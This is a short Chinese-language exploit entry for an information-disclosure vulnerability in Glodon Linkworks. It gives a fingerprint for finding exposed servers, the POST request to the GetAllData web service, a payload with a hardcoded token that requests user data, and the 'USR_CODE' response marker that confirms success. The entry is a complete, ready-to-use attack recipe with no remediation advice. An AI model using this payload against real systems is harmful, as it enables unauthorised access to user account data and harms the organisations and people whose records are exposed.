# 广联达LinkworksGetAllData信息泄露漏洞

广联达LinkworksGetAllData ｜ 信息泄露 ｜ —
- **指纹**：`body="Services/Identification/login.ashx"`
- **请求**：`POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1`

**Payload**
```
Token=!@#$asdf$#@!&DataType=user
```
- **响应特征**：200 USR_CODE